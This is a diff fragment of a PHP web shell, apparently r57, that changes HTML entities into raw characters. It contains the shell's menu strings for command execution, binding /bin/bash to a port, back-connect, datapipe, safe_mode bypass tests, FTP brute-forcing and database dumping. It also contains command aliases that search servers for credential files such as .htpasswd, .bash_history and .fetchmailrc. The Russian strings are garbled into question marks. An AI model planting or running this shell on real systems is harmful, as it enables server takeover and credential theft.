-          $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=Verdana size=-2&gt;&lt;b&gt;'.trim($info[0]).'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.trim($info[1]).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
+          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
         }
       echo $r;
     }
    else
     {
-      echo '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt; --- &lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;';
+      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
     }
-   echo '&lt;/table&gt;';
-   echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
+   echo '</table>';
+   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
    die();
  }
 if(isset($_GET['mem']))
  {
    echo $head;
-   echo '&lt;table width=100%&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;MEMORY&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=100%&gt;';
+   echo '<table width=100%><tr><td bgcolor=#396D95><div align=center><font face=Verdana size=-2 color=orange><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
    $memf = @file("meminfo");
    if($memf)
     {
       $c = sizeof($memf);
-      for($i=0;$i&lt;$c;$i++)
+      for($i=0;$i<$c;$i++)
         {
           $info = explode(":",$memf[$i]);
           if($info[1]==""){ $info[1]="---"; }
-          $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=Verdana size=-2&gt;&lt;b&gt;'.trim($info[0]).'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.trim($info[1]).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
+          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
         }
       echo $r;
     }
    else
     {
-      echo '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt; --- &lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;';
+      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
     }
-   echo '&lt;/table&gt;';
-   echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
+   echo '</table>';
+   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
    die();
  }
 $lang=array(
-'ru_text1' =&gt;'??????????? ???????',
-'ru_text2' =&gt;'?????????? ?????? ?? ???????',
-'ru_text3' =&gt;'????????? ???????',
-'ru_text4' =&gt;'??????? ??????????',
-'ru_text5' =&gt;'???????? ?????? ?? ??????',
-'ru_text6' =&gt;'????????? ????',
-'ru_text7' =&gt;'??????',
-'ru_text8' =&gt;'???????? ?????',
-'ru_butt1' =&gt;'?????????',
-'ru_butt2' =&gt;'?????????',
-'ru_text9' =&gt;'???????? ????? ? ???????? ??? ? /bin/bash',
-'ru_text10'=&gt;'??????? ????',
-'ru_text11'=&gt;'?????? ??? ???????',
-'ru_butt3' =&gt;'???????',
-'ru_text12'=&gt;'back-connect',
-'ru_text13'=&gt;'IP-?????',
-'ru_text14'=&gt;'????',
-'ru_butt4' =&gt;'?????????',
-'ru_text15'=&gt;'???????? ?????? ? ?????????? ???????',
-'ru_text16'=&gt;'????????????',
-'ru_text17'=&gt;'????????? ????',
-'ru_text18'=&gt;'????????? ????',
-'ru_text19'=&gt;'Exploits',
-'ru_text20'=&gt;'????????????',
-'ru_text21'=&gt;'????? ???',
-'ru_text22'=&gt;'datapipe',
-'ru_text23'=&gt;'????????? ????',
-'ru_text24'=&gt;'????????? ????',
-'ru_text25'=&gt;'????????? ????',
-'ru_text26'=&gt;'????????????',
-'ru_butt5' =&gt;'?????????',
-'ru_text28'=&gt;'?????? ? safe_mode',
-'ru_text29'=&gt;'?????? ????????',
-'ru_butt6' =&gt;'???????',
-'ru_text30'=&gt;'???????? ?????',
-'ru_butt7' =&gt;'???????',
-'ru_text31'=&gt;'???? ?? ??????',
-'ru_text32'=&gt;'?????????? PHP ????',
-'ru_text33'=&gt;'???????? ??????????? ?????? ??????????? open_basedir ????? ??????? cURL',
-'ru_butt8' =&gt;'?????????',
-'ru_text34'=&gt;'???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include',
-'ru_text35'=&gt;'???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql',
-'ru_text36'=&gt;'???? . ???????',
-'ru_text37'=&gt;'?????',
-'ru_text38'=&gt;'??????',
-'ru_text39'=&gt;'????',
-'ru_text40'=&gt;'???? ??????? ???? ??????',
-'ru_butt9' =&gt;'????',
-'ru_text41'=&gt;'????????? ? ?????',
-'ru_text42'=&gt;'?????????????? ?????',
-'ru_text43'=&gt;'????????????? ????',
-'ru_butt10'=&gt;'?????????',
-'ru_butt11'=&gt;'?????????????',
-'ru_text44'=&gt;'?????????????? ????? ??????????! ?????? ?????? ??? ??????!',
-'ru_text45'=&gt;'???? ????????',
-'ru_text46'=&gt;'???????? phpinfo()',
-'ru_text47'=&gt;'???????? ???????? php.ini',
-'ru_text48'=&gt;'???????? ????????? ??????',
-'ru_text49'=&gt;'???????? ??????? ? ???????',
-'ru_text50'=&gt;'?????????? ? ??????????',
-'ru_text51'=&gt;'?????????? ? ??????',
-'ru_text52'=&gt;'????? ??? ??????',
-'ru_text53'=&gt;'?????? ? ?????',
-'ru_text54'=&gt;'????? ?????? ? ??????',
-'ru_butt12'=&gt;'?????',
-'ru_text55'=&gt;'?????? ? ??????',
-'ru_text56'=&gt;'?????? ?? ???????',
-'ru_text57'=&gt;'???????/??????? ????/??????????',
-'ru_text58'=&gt;'???',
-'ru_text59'=&gt;'????',
-'ru_text60'=&gt;'??????????',
-'ru_butt13'=&gt;'???????/???????',
-'ru_text61'=&gt;'???? ??????',
-'ru_text62'=&gt;'?????????? ???????',
-'ru_text63'=&gt;'???? ??????',
-'ru_text64'=&gt;'?????????? ???????',
-'ru_text65'=&gt;'???????',
-'ru_text66'=&gt;'???????',
-'ru_text67'=&gt;'Chown/Chgrp/Chmod',
-'ru_text68'=&gt;'???????',
-'ru_text69'=&gt;'????????1',
-'ru_text70'=&gt;'????????2',
-'ru_text71'=&gt;"?????? ???????? ???????:\r\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \r\n- ??? ??????? CHGRP - ??? ?????? ??? GID (??????) \r\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)",
-'ru_text72'=&gt;'????? ??? ??????',
-'ru_text73'=&gt;'?????? ? ?????',
-'ru_text74'=&gt;'?????? ? ??????',
-'ru_text75'=&gt;'* ????? ???????????? ?????????? ?????????',
-'ru_text76'=&gt;'????? ?????? ? ?????? ? ??????? ??????? find',
-'ru_text80'=&gt;'???',
-'ru_text81'=&gt;'????',
-'ru_text82'=&gt;'???? ??????',
-'ru_text83'=&gt;'?????????? SQL ???????',
-'ru_text84'=&gt;'SQL ??????',
-'ru_text85'=&gt;'???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????',
-'ru_text86'=&gt;'?????????? ????? ? ???????',
-'ru_butt14'=&gt;'???????',
-'ru_text87'=&gt;'?????????? ?????? ? ?????????? ftp-???????',
-'ru_text88'=&gt;'FTP-??????:????',
-'ru_text89'=&gt;'???? ?? ftp ???????',
-'ru_text90'=&gt;'????? ????????',
-'ru_text91'=&gt;'???????????? ?',
-'ru_text92'=&gt;'??? ?????????',
-'ru_text93'=&gt;'FTP',
-'ru_text94'=&gt;'FTP-????????',
-'ru_text95'=&gt;'?????? ?????????????',
-'ru_text96'=&gt;'?? ??????? ???????? ?????? ?????????????',
-'ru_text97'=&gt;'????????? ??????????: ',
-'ru_text98'=&gt;'??????? ???????????: ',
-'ru_text99'=&gt;'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd',
-'ru_text100'=&gt;'???????? ?????? ?? ????????? ??? ??????',
-'ru_text101'=&gt;'???????????? ????? ???????????? (user -&gt; resu) ??? ???????????? ? ???????? ??????',
-'ru_text102'=&gt;'?????',
-'ru_text103'=&gt;'???????? ??????',
-'ru_text104'=&gt;'???????? ????? ?? ???????? ????',
-'ru_text105'=&gt;'????',
-'ru_text106'=&gt;'??',
-'ru_text107'=&gt;'????',
-'ru_butt15'=&gt;'?????????',
-'ru_text108'=&gt;'????? ??????',
-'ru_text109'=&gt;'????????',
-'ru_text110'=&gt;'??????????',
-'ru_text111'=&gt;'SQL-?????? : ????',
-'ru_text112'=&gt;'???????? ??????????? ?????? ??????????? safe_mode ????? ????????????? ??????? mb_send_mail',
-'ru_text113'=&gt;'???????? ??????????? ?????? ??????????? safe_mode, ???????? ???????? ?????????? ? ?????????????? imap_list',
-'ru_text114'=&gt;'???????? ??????????? ?????? ??????????? safe_mode, ???????? ??????????? ????? ? ?????????????? imap_body',
+'ru_text1' =>'??????????? ???????',
+'ru_text2' =>'?????????? ?????? ?? ???????',
+'ru_text3' =>'????????? ???????',
+'ru_text4' =>'??????? ??????????',
+'ru_text5' =>'???????? ?????? ?? ??????',
+'ru_text6' =>'????????? ????',
+'ru_text7' =>'??????',
+'ru_text8' =>'???????? ?????',
+'ru_butt1' =>'?????????',
+'ru_butt2' =>'?????????',
+'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash',
+'ru_text10'=>'??????? ????',
+'ru_text11'=>'?????? ??? ???????',
+'ru_butt3' =>'???????',
+'ru_text12'=>'back-connect',
+'ru_text13'=>'IP-?????',
+'ru_text14'=>'????',
+'ru_butt4' =>'?????????',
+'ru_text15'=>'???????? ?????? ? ?????????? ???????',
+'ru_text16'=>'????????????',
+'ru_text17'=>'????????? ????',
+'ru_text18'=>'????????? ????',
+'ru_text19'=>'Exploits',
+'ru_text20'=>'????????????',
+'ru_text21'=>'????? ???',
+'ru_text22'=>'datapipe',
+'ru_text23'=>'????????? ????',
+'ru_text24'=>'????????? ????',
+'ru_text25'=>'????????? ????',
+'ru_text26'=>'????????????',
+'ru_butt5' =>'?????????',
+'ru_text28'=>'?????? ? safe_mode',
+'ru_text29'=>'?????? ????????',
+'ru_butt6' =>'???????',
+'ru_text30'=>'???????? ?????',
+'ru_butt7' =>'???????',
+'ru_text31'=>'???? ?? ??????',
+'ru_text32'=>'?????????? PHP ????',
+'ru_text33'=>'???????? ??????????? ?????? ??????????? open_basedir ????? ??????? cURL',
+'ru_butt8' =>'?????????',
+'ru_text34'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include',
+'ru_text35'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql',
+'ru_text36'=>'???? . ???????',
+'ru_text37'=>'?????',
+'ru_text38'=>'??????',
+'ru_text39'=>'????',
+'ru_text40'=>'???? ??????? ???? ??????',
+'ru_butt9' =>'????',
+'ru_text41'=>'????????? ? ?????',
+'ru_text42'=>'?????????????? ?????',
+'ru_text43'=>'????????????? ????',
+'ru_butt10'=>'?????????',
+'ru_butt11'=>'?????????????',
+'ru_text44'=>'?????????????? ????? ??????????! ?????? ?????? ??? ??????!',
+'ru_text45'=>'???? ????????',
+'ru_text46'=>'???????? phpinfo()',
+'ru_text47'=>'???????? ???????? php.ini',
+'ru_text48'=>'???????? ????????? ??????',
+'ru_text49'=>'???????? ??????? ? ???????',
+'ru_text50'=>'?????????? ? ??????????',
+'ru_text51'=>'?????????? ? ??????',
+'ru_text52'=>'????? ??? ??????',
+'ru_text53'=>'?????? ? ?????',
+'ru_text54'=>'????? ?????? ? ??????',
+'ru_butt12'=>'?????',
+'ru_text55'=>'?????? ? ??????',
+'ru_text56'=>'?????? ?? ???????',
+'ru_text57'=>'???????/??????? ????/??????????',
+'ru_text58'=>'???',
+'ru_text59'=>'????',
+'ru_text60'=>'??????????',
+'ru_butt13'=>'???????/???????',
+'ru_text61'=>'???? ??????',
+'ru_text62'=>'?????????? ???????',
+'ru_text63'=>'???? ??????',
+'ru_text64'=>'?????????? ???????',
+'ru_text65'=>'???????',
+'ru_text66'=>'???????',
+'ru_text67'=>'Chown/Chgrp/Chmod',
+'ru_text68'=>'???????',
+'ru_text69'=>'????????1',
+'ru_text70'=>'????????2',
+'ru_text71'=>"?????? ???????? ???????:\r\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \r\n- ??? ??????? CHGRP - ??? ?????? ??? GID (??????) \r\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)",
+'ru_text72'=>'????? ??? ??????',
+'ru_text73'=>'?????? ? ?????',
+'ru_text74'=>'?????? ? ??????',
+'ru_text75'=>'* ????? ???????????? ?????????? ?????????',
+'ru_text76'=>'????? ?????? ? ?????? ? ??????? ??????? find',
+'ru_text80'=>'???',
+'ru_text81'=>'????',
+'ru_text82'=>'???? ??????',
+'ru_text83'=>'?????????? SQL ???????',
+'ru_text84'=>'SQL ??????',
+'ru_text85'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????',
+'ru_text86'=>'?????????? ????? ? ???????',
+'ru_butt14'=>'???????',
+'ru_text87'=>'?????????? ?????? ? ?????????? ftp-???????',
+'ru_text88'=>'FTP-??????:????',
+'ru_text89'=>'???? ?? ftp ???????',
+'ru_text90'=>'????? ????????',
+'ru_text91'=>'???????????? ?',
+'ru_text92'=>'??? ?????????',
+'ru_text93'=>'FTP',
+'ru_text94'=>'FTP-????????',
+'ru_text95'=>'?????? ?????????????',
+'ru_text96'=>'?? ??????? ???????? ?????? ?????????????',
+'ru_text97'=>'????????? ??????????: ',
+'ru_text98'=>'??????? ???????????: ',
+'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd',
+'ru_text100'=>'???????? ?????? ?? ????????? ??? ??????',
+'ru_text101'=>'???????????? ????? ???????????? (user -> resu) ??? ???????????? ? ???????? ??????',
+'ru_text102'=>'?????',
+'ru_text103'=>'???????? ??????',
+'ru_text104'=>'???????? ????? ?? ???????? ????',
+'ru_text105'=>'????',
+'ru_text106'=>'??',
+'ru_text107'=>'????',
+'ru_butt15'=>'?????????',
+'ru_text108'=>'????? ??????',
+'ru_text109'=>'????????',
+'ru_text110'=>'??????????',
+'ru_text111'=>'SQL-?????? : ????',
+'ru_text112'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ????????????? ??????? mb_send_mail',
+'ru_text113'=>'???????? ??????????? ?????? ??????????? safe_mode, ???????? ???????? ?????????? ? ?????????????? imap_list',
+'ru_text114'=>'???????? ??????????? ?????? ??????????? safe_mode, ???????? ??????????? ????? ? ?????????????? imap_body',
 /* --------------------------------------------------------------- */
-'tur_text1' =&gt;'Komut uygula',
-'tur_text2' =&gt;'Server uzerinde komut uygula',
-'tur_text3' =&gt;'Komut calistir gulum',
-'tur_text4' =&gt;'simdi burdasin',
-'tur_text5' =&gt;'Servera dosya yukle',
-'tur_text6' =&gt;'Yerel dosya',
-'tur_text7' =&gt;'Aliases',
-'tur_text8' =&gt;'Select alias',
-'tur_butt1' =&gt;'taam gulum :)',
-'tur_butt2' =&gt;'y&#252;kle bilader',
-'tur_text9' =&gt;'Bind port to /bin/bash',
-'tur_text10'=&gt;'Port',
-'tur_text11'=&gt;'Password for access',
-'tur_butt3' =&gt;'Bind',
-'tur_text12'=&gt;'Arka taraf',
-'tur_text13'=&gt;'IP',
-'tur_text14'=&gt;'Port',
-'tur_butt4' =&gt;'Rootlucam baglan lutfen',
-'tur_text15'=&gt;'Uzak serverdan dosya yukle',
-'tur_text16'=&gt;'Ile',
-'tur_text17'=&gt;'Remote file',
-'tur_text18'=&gt;'Local file',
-'tur_text19'=&gt;'Exploits',
-'tur_text20'=&gt;'Kullan',
-'tur_text21'=&gt;'&nbsp;yeni isim ver abi',
-'tur_text22'=&gt;'datapipe',
-'tur_text23'=&gt;'Local port',
-'tur_text24'=&gt;'Remote host',
-'tur_text25'=&gt;'Remote port',
-'tur_text26'=&gt;'Kullan',
-'tur_butt5' =&gt;'Calistir',
-'tur_text28'=&gt;'Su anki durum safe_mode',
-'tur_text29'=&gt;'ACCESS DENIED',
-'tur_butt6' =&gt;'d&#252;zenle bilader',
-'tur_text30'=&gt;'Cat file',
-'tur_butt7' =&gt;'bakabilirmiyim abi',
-'tur_text31'=&gt;'&#246;yle bi dosya yok bilader',
-'tur_text32'=&gt;'Eval PHP code',
-'tur_text33'=&gt;'Test bypass open_basedir with cURL functions',
-'tur_butt8' =&gt;'Test',
-'tur_text34'=&gt;'Test bypass safe_mode with include function',
-'tur_text35'=&gt;'Test bypass safe_mode with load file in mysql',
-'tur_text36'=&gt;'Database . Tablo',
-'tur_text37'=&gt;'Giris',
-'tur_text38'=&gt;'Sifre',
-'tur_text39'=&gt;'Database',
-'tur_text40'=&gt;'Bosaltilacak database tablosu',
-'tur_butt9' =&gt;'Bosalt',
-'tur_text41'=&gt;'Bosaltilan dosyayi kaydet',
-'tur_text42'=&gt;'Dosyalari duzenle',
-'tur_text43'=&gt;'Dosya duzenle',
-'tur_butt10'=&gt;'taam basabiliriz :)',
-'tur_text44'=&gt;'malesef gulum! sansina kus!',
-'tur_text45'=&gt;'taam bilader kaydettim',
-'tur_text46'=&gt;'Goster phpinfo()',
-'tur_text47'=&gt;'Degiskenleri goster php.ini',
-'tur_text48'=&gt;'Temp doslarini sil',
-'tur_butt11'=&gt;'duzenle abi',
-'tur_text49'=&gt;'Serverdan script sil',
-'tur_text50'=&gt;'Islemci bilgisine bak',
-'tur_text51'=&gt;'Haf?za bilgisine bak',
-'tur_text52'=&gt;'Metin ara',
-'tur_text53'=&gt;'In dirs',
-'tur_text54'=&gt;'Dosyalarin icinde metin ara',
-'tur_butt12'=&gt;'Ara',
-'tur_text55'=&gt;'Dosyalarda',
-'tur_text56'=&gt;'Hicbirsey :(',
-'tur_text57'=&gt;'Yarat/Dosya sil/Dir',
-'tur_text58'=&gt;'isim',
-'tur_text59'=&gt;'dosya',
-'tur_text60'=&gt;'dir',
-'tur_butt13'=&gt;'Yarat/Sil',
-'tur_text61'=&gt;'Dosya yaratildi',
-'tur_text62'=&gt;'Dir created',
-'tur_text63'=&gt;'Dosya silindi',
-'tur_text64'=&gt;'Dir deleted',
-'tur_text65'=&gt;'Yarat',
-'tur_text66'=&gt;'Sil',
-'tur_text67'=&gt;'Chown/Chgrp/Chmod',
-'tur_text68'=&gt;'Komut',
-'tur_text69'=&gt;'param1',
-'tur_text70'=&gt;'param2',
-'tur_text71'=&gt;"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
-'tur_text72'=&gt;'Metin icin ara',
-'tur_text73'=&gt;'Klasor icin ara',
-'tur_text74'=&gt;'Dosyalarin icinde ara',
-'tur_text75'=&gt;'* you can use regexp',
-'tur_text76'=&gt;'Search text in files via find',
-'tur_text80'=&gt;'Type',
-'tur_text81'=&gt;'Net',
-'tur_text82'=&gt;'Databases',
-'tur_text83'=&gt;'SQL da sorgula',
-'tur_text84'=&gt;'SQL sor',
-'tur_text85'=&gt;'Test bypass safe_mode with commands execute via MSSQL server',
-'tur_text86'=&gt;'Serverdan dosya indir',
-'tur_butt14'=&gt;'Indir',
-'tur_text87'=&gt;'Uzak ftp sunucusundan doysa indir',
-'tur_text88'=&gt;'FTP-server:port',
-'tur_text89'=&gt;'Ftp de dosya',
-'tur_text90'=&gt;'Transfer modu',
-'tur_text91'=&gt;'Arsivleme',
-'tur_text92'=&gt;'without archivation',
-'tur_text93'=&gt;'FTP',
-'tur_text94'=&gt;'FTP-bruteforce',
-'tur_text95'=&gt;'Kullanici listesi',
-'tur_text96'=&gt;'Can\'t get users list',
-'tur_text97'=&gt;'checked: ',
-'tur_text98'=&gt;'success: ',
-'tur_text99'=&gt;'* kullanici isimlerinde /etc/passwd for ftp Giris ve sifre',
-'tur_text100'=&gt;'Uzak ftp sunucusuna dosya yolla',
-'tur_text101'=&gt;'Use reverse (user -&gt; resu) login for password',
-'tur_text102'=&gt;'Mail',
-'tur_text103'=&gt;'Mail yolla',
-'tur_text104'=&gt;'Dosyayi maile yolla',
-'tur_text105'=&gt;'To',
-'tur_text106'=&gt;'From',
-'tur_text107'=&gt;'Subj',
-'tur_butt15'=&gt;'Yolla',
-'tur_text108'=&gt;'Mail',
-'tur_text109'=&gt;'Hide',
-'tur_text110'=&gt;'Goster',
-'tur_text111'=&gt;'SQL-Server : Port',
-'tur_text112'=&gt;'Test bypass safe_mode with function mb_send_mail',
-'tur_text113'=&gt;'Test bypass safe_mode, view dir list via imap_list',
-'tur_text114'=&gt;'Test bypass safe_mode, view file contest via imap_body',
+'tur_text1' =>'Komut uygula',
+'tur_text2' =>'Server uzerinde komut uygula',
+'tur_text3' =>'Komut calistir gulum',
+'tur_text4' =>'simdi burdasin',
+'tur_text5' =>'Servera dosya yukle',
+'tur_text6' =>'Yerel dosya',
+'tur_text7' =>'Aliases',
+'tur_text8' =>'Select alias',
+'tur_butt1' =>'taam gulum :)',
+'tur_butt2' =>'y&#252;kle bilader',
+'tur_text9' =>'Bind port to /bin/bash',
+'tur_text10'=>'Port',
+'tur_text11'=>'Password for access',
+'tur_butt3' =>'Bind',
+'tur_text12'=>'Arka taraf',
+'tur_text13'=>'IP',
+'tur_text14'=>'Port',
+'tur_butt4' =>'Rootlucam baglan lutfen',
+'tur_text15'=>'Uzak serverdan dosya yukle',
+'tur_text16'=>'Ile',
+'tur_text17'=>'Remote file',
+'tur_text18'=>'Local file',
+'tur_text19'=>'Exploits',
+'tur_text20'=>'Kullan',
+'tur_text21'=>'&nbsp;yeni isim ver abi',
+'tur_text22'=>'datapipe',
+'tur_text23'=>'Local port',
+'tur_text24'=>'Remote host',
+'tur_text25'=>'Remote port',
+'tur_text26'=>'Kullan',
+'tur_butt5' =>'Calistir',
+'tur_text28'=>'Su anki durum safe_mode',
+'tur_text29'=>'ACCESS DENIED',
+'tur_butt6' =>'d&#252;zenle bilader',
+'tur_text30'=>'Cat file',
+'tur_butt7' =>'bakabilirmiyim abi',
+'tur_text31'=>'&#246;yle bi dosya yok bilader',
+'tur_text32'=>'Eval PHP code',
+'tur_text33'=>'Test bypass open_basedir with cURL functions',
+'tur_butt8' =>'Test',
+'tur_text34'=>'Test bypass safe_mode with include function',
+'tur_text35'=>'Test bypass safe_mode with load file in mysql',
+'tur_text36'=>'Database . Tablo',
+'tur_text37'=>'Giris',
+'tur_text38'=>'Sifre',
+'tur_text39'=>'Database',
+'tur_text40'=>'Bosaltilacak database tablosu',
+'tur_butt9' =>'Bosalt',
+'tur_text41'=>'Bosaltilan dosyayi kaydet',
+'tur_text42'=>'Dosyalari duzenle',
+'tur_text43'=>'Dosya duzenle',
+'tur_butt10'=>'taam basabiliriz :)',
+'tur_text44'=>'malesef gulum! sansina kus!',
+'tur_text45'=>'taam bilader kaydettim',
+'tur_text46'=>'Goster phpinfo()',
+'tur_text47'=>'Degiskenleri goster php.ini',
+'tur_text48'=>'Temp doslarini sil',
+'tur_butt11'=>'duzenle abi',
+'tur_text49'=>'Serverdan script sil',
+'tur_text50'=>'Islemci bilgisine bak',
+'tur_text51'=>'Haf?za bilgisine bak',
+'tur_text52'=>'Metin ara',
+'tur_text53'=>'In dirs',
+'tur_text54'=>'Dosyalarin icinde metin ara',
+'tur_butt12'=>'Ara',
+'tur_text55'=>'Dosyalarda',
+'tur_text56'=>'Hicbirsey :(',
+'tur_text57'=>'Yarat/Dosya sil/Dir',
+'tur_text58'=>'isim',
+'tur_text59'=>'dosya',
+'tur_text60'=>'dir',
+'tur_butt13'=>'Yarat/Sil',
+'tur_text61'=>'Dosya yaratildi',
+'tur_text62'=>'Dir created',
+'tur_text63'=>'Dosya silindi',
+'tur_text64'=>'Dir deleted',
+'tur_text65'=>'Yarat',
+'tur_text66'=>'Sil',
+'tur_text67'=>'Chown/Chgrp/Chmod',
+'tur_text68'=>'Komut',
+'tur_text69'=>'param1',
+'tur_text70'=>'param2',
+'tur_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
+'tur_text72'=>'Metin icin ara',
+'tur_text73'=>'Klasor icin ara',
+'tur_text74'=>'Dosyalarin icinde ara',
+'tur_text75'=>'* you can use regexp',
+'tur_text76'=>'Search text in files via find',
+'tur_text80'=>'Type',
+'tur_text81'=>'Net',
+'tur_text82'=>'Databases',
+'tur_text83'=>'SQL da sorgula',
+'tur_text84'=>'SQL sor',
+'tur_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
+'tur_text86'=>'Serverdan dosya indir',
+'tur_butt14'=>'Indir',
+'tur_text87'=>'Uzak ftp sunucusundan doysa indir',
+'tur_text88'=>'FTP-server:port',
+'tur_text89'=>'Ftp de dosya',
+'tur_text90'=>'Transfer modu',
+'tur_text91'=>'Arsivleme',
+'tur_text92'=>'without archivation',
+'tur_text93'=>'FTP',
+'tur_text94'=>'FTP-bruteforce',
+'tur_text95'=>'Kullanici listesi',
+'tur_text96'=>'Can\'t get users list',
+'tur_text97'=>'checked: ',
+'tur_text98'=>'success: ',
+'tur_text99'=>'* kullanici isimlerinde /etc/passwd for ftp Giris ve sifre',
+'tur_text100'=>'Uzak ftp sunucusuna dosya yolla',
+'tur_text101'=>'Use reverse (user -> resu) login for password',
+'tur_text102'=>'Mail',
+'tur_text103'=>'Mail yolla',
+'tur_text104'=>'Dosyayi maile yolla',
+'tur_text105'=>'To',
+'tur_text106'=>'From',
+'tur_text107'=>'Subj',
+'tur_butt15'=>'Yolla',
+'tur_text108'=>'Mail',
+'tur_text109'=>'Hide',
+'tur_text110'=>'Goster',
+'tur_text111'=>'SQL-Server : Port',
+'tur_text112'=>'Test bypass safe_mode with function mb_send_mail',
+'tur_text113'=>'Test bypass safe_mode, view dir list via imap_list',
+'tur_text114'=>'Test bypass safe_mode, view file contest via imap_body',
 );
 /*
 ?????? ??????
@@ -1118,64 +1118,64 @@ $lang=array(
 ?? ?????? ???? ????????? ??? ???????? ???????.
 */
 $aliases=array(
-'find suid files'=&gt;'find / -type f -perm -04000 -ls',
-'find suid files in current dir'=&gt;'find . -type f -perm -04000 -ls',
-'find sgid files'=&gt;'find / -type f -perm -02000 -ls',
-'find sgid files in current dir'=&gt;'find . -type f -perm -02000 -ls',
-'find config.inc.php files'=&gt;'find / -type f -name config.inc.php',
-'find config.inc.php files in current dir'=&gt;'find . -type f -name config.inc.php',
-'find config* files'=&gt;'find / -type f -name "config*"',
-'find config* files in current dir'=&gt;'find . -type f -name "config*"',
-'find all writable files'=&gt;'find / -type f -perm -2 -ls',
-'find all writable files in current dir'=&gt;'find . -type f -perm -2 -ls',
-'find all writable directories'=&gt;'find /  -type d -perm -2 -ls',
-'find all writable directories in current dir'=&gt;'find . -type d -perm -2 -ls',
-'find all writable directories and files'=&gt;'find / -perm -2 -ls',
-'find all writable directories and files in current dir'=&gt;'find . -perm -2 -ls',
-'find all service.pwd files'=&gt;'find / -type f -name service.pwd',
-'find service.pwd files in current dir'=&gt;'find . -type f -name service.pwd',
-'find all .htpasswd files'=&gt;'find / -type f -name .htpasswd',
-'find .htpasswd files in current dir'=&gt;'find . -type f -name .htpasswd',
-'find all .bash_history files'=&gt;'find / -type f -name .bash_history',
-'find .bash_history files in current dir'=&gt;'find . -type f -name .bash_history',
-'find all .mysql_history files'=&gt;'find / -type f -name .mysql_history',
-'find .mysql_history files in current dir'=&gt;'find . -type f -name .mysql_history',
-'find all .fetchmailrc files'=&gt;'find / -type f -name .fetchmailrc',
-'find .fetchmailrc files in current dir'=&gt;'find . -type f -name .fetchmailrc',
-'list file attributes on a Linux second extended file system'=&gt;'lsattr -va',
-'show opened ports'=&gt;'netstat -an | grep -i listen',
-'----------------------------------------------------------------------------------------------------'=&gt;'ls -la'
+'find suid files'=>'find / -type f -perm -04000 -ls',
+'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
+'find sgid files'=>'find / -type f -perm -02000 -ls',
+'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
+'find config.inc.php files'=>'find / -type f -name config.inc.php',
+'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
+'find config* files'=>'find / -type f -name "config*"',
+'find config* files in current dir'=>'find . -type f -name "config*"',
